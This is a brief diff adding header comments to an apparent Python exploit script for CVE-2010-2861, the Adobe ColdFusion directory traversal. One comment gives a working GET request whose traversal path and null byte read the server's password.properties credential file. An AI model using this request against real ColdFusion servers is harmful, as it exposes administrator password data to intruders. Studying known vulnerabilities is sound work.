@@ -1,5 +1,14 @@
 #!/usr/bin/python3
 
+# Working GET request courtesy of carnal0wnage:
+# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+#
+# LLsecurity added another admin page filename: "/CFIDE/administrator/enter.cfm"
+
+# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
+# detailed information about the exploitation of this vulnerability:
+# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+
 import sys
 import socket
 import re
